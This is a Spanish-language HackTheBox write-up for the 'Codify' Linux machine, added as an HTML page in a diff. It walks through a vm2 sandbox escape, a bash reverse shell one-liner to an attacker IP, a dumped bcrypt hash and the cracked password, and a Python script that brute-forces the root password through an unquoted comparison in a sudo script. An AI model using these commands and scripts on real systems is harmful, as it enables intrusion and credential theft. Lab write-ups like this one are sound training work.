@@ -1,0 +1,181 @@
+<!doctype html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="icon" type="image/png" href="/favicon-monkey.png?v=20260601" />
+    <title>RuyzTz7 | Codify HTB</title>
+    <link rel="stylesheet" href="/section.css" />
+  </head>
+  <body>
+    <main class="section-shell writeup-detail-shell">
+      <a class="back-link" href="/writeups/linux.html">~/writeups/linux</a>
+
+      <section class="writeup-detail-hero">
+        <img src="/writeups/assets/codify/pasted-20260406142831.png" alt="Codify HTB" />
+        <div>
+          <p class="eyebrow">HTB / machines / Linux</p>
+          <h1>Codify</h1>
+          <div class="tag-list" aria-label="Tags">
+            <span>node</span>
+            <span>vm2</span>
+            <span>sqlite</span>
+            <span>sudoers</span>
+          </div>
+        </div>
+      </section>
+
+      <article class="writeup-article">
+        <section class="writeup-section">
+          <h2>Índice</h2>
+          <ul>
+            <li><code>Enumeración</code>: Aplicación web que ejecuta código Node.js</li>
+            <li><code>Explotación</code>: Sandbox <code>vm2</code> vulnerable a RCE</li>
+            <li><code>Movimiento lateral</code>: Base de datos SQLite revela hash crackeable de <code>joshua</code></li>
+            <li><code>Escalada de Privilegios</code>: Script sudo vulnerable por comparación sin comillas y extracción de contraseña con fuerza bruta o pspy</li>
+          </ul>
+        </section>
+        <section class="writeup-section">
+          <h2>Enumeración</h2>
+          <img class="writeup-image" src="/writeups/assets/codify/pasted-20260406142900.png" alt="Codify HTB" />
+          <img class="writeup-image" src="/writeups/assets/codify/pasted-20260406150000.png" alt="Codify HTB" />
+          <img class="writeup-image" src="/writeups/assets/codify/pasted-20260406152008.png" alt="Codify HTB" />
+        </section>
+        <section class="writeup-section">
+          <h2>Explotación</h2>
+          <p><a href="https://gist.github.com/leesh3288/381b230b04936dd4d74aaf90cc8bb244">PoC</a></p>
+          <img class="writeup-image" src="/writeups/assets/codify/pasted-20260406152107.png" alt="Codify HTB" />
+          <div class="code-card">
+            <h3>One Liner Bash</h3>
+            <pre><code>bash -c "bash -i &gt;&amp; /dev/tcp/10.10.16.178/443 0&gt;&amp;1"</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/codify/pasted-20260406152652.png" alt="Codify HTB" />
+          <img class="writeup-image" src="/writeups/assets/codify/pasted-20260406152721.png" alt="Codify HTB" />
+        </section>
+        <section class="writeup-section">
+          <h2>Movimiento lateral: Fichero .db y sqlite3</h2>
+          <div class="code-card">
+            <h3>Enumerar ficheros .db</h3>
+            <pre><code>sqlite3 tickets.db
+.tables
+.schema users
+select * from users;
+# Credenciales -&gt; joshua:$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2
+# joshua:spongebob1</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/codify/pasted-20260406165253.png" alt="Codify HTB" />
+          <img class="writeup-image" src="/writeups/assets/codify/pasted-20260406165626.png" alt="Codify HTB" />
+        </section>
+        <section class="writeup-section">
+          <h2>Escalada de Privilegios</h2>
+          <div class="code-card">
+            <h3>SSH y sudoers</h3>
+            <pre><code>ssh joshua@10.129.16.65
+sudo -l</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/codify/pasted-20260406165734.png" alt="Codify HTB" />
+          <div class="code-card">
+            <h3>Analizar Script</h3>
+            <pre><code># Al validar la contraseña lo hace sin usar comillas dobles por lo que al usar regex podemos igualar las sentencias y hacer que sea true
+# Si usamos un simple asterisco ya se valida -&gt; root_password = *
+# O si la contraseña es alvaro123 -&gt; alvaro123 = alva*
+sudo /opt/scripts/mysql-backup.sh
+# Password: *</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/codify/pasted-20260406172035.png" alt="Codify HTB" />
+          <img class="writeup-image" src="/writeups/assets/codify/pasted-20260406172439.png" alt="Codify HTB" />
+          <div class="code-card">
+            <h3>Ejecutar Script como sudo y usar pspy para ver la contraseña que usa en el comando tras validar el condicional</h3>
+            <pre><code>sudo /opt/scripts/mysql-backup.sh</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/codify/pasted-20260406172312.png" alt="Codify HTB" />
+        </section>
+        <section class="writeup-section">
+          <h2>Extraer contraseña con script python</h2>
+          <div class="code-card">
+            <h3>BruteForce.py</h3>
+            <pre><code>#!/usr/bin/env python3
+
+import requests, signal, time, sys, os, subprocess
+
+def def_handler(sig, frame):
+    print("\n\n[!] Saliendo...\n")
+    sys.exit(1)
+# Ctrl+C
+signal.signal(signal.SIGINT, def_handler)
+
+abc = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%&amp;=-_.,;:"
+
+def cmd(pwd):
+    command = f"echo '{pwd}' | sudo -S /opt/scripts/mysql-backup.sh"
+    
+    result = subprocess.run(
+        command,
+        shell=True,
+        capture_output=True,
+        text=True
+    )
+    
+    return result.stdout + result.stderr
+
+def brute_force_attack():
+    password = ""
+    while True:
+        found = False
+        for c in abc:
+            character = c + "*"
+            pass_testing = password + character  
+            print("[/] Probando con la contraseña: " + pass_testing)
+            output = cmd(pass_testing)
+            if "Password confirmed!" in output:
+                password += c
+                found = True
+                break
+        if not found:
+            print(f"\n[+] Password final: {password}")
+            break
+
+if __name__ == '__main__':
+    brute_force_attack()</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/codify/pasted-20260406181927.png" alt="Codify HTB" />
+          <div class="code-card">
+            <h3>Conexión como Root</h3>
+            <pre><code>su root
+# Password: kljh12k3jhaskjh12kjh3</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/codify/pasted-20260406181900.png" alt="Codify HTB" />
+        </section>
+        <section class="writeup-section">
+          <h2>Extraer contraseña con pspy</h2>
+          <p><a href="https://github.com/DominicBreuker/pspy/releases">pspy</a></p>
+          <div class="code-card">
+            <h3>PSPY: Monitorizar Ejecuciones en Busca de Cron</h3>
+            <pre><code>wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64
+chmod +x pspy64
+./pspy64</code></pre>
+          </div>
+          <div class="code-card">
+            <h3>En paralelo en otra terminal ejecutar </h3>
+            <pre><code>sudo /opt/scripts/mysql-backup.sh
+# Password joshua: spongebob1
+# Password root: *</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/codify/pasted-20260407000021.png" alt="Codify HTB" />
+        </section>
+        <section class="writeup-section">
+          <h2>Tags</h2>
+          <div class="tag-list">
+            <span>node</span>
+            <span>vm2</span>
+            <span>sqlite</span>
+            <span>sudoers</span>
+            <span>script_py</span>
+            <span>pspy</span>
+            <span>sanitizacion</span>
+          </div>
+        </section>
+      </article>
+    </main>
+  </body>
+</html>
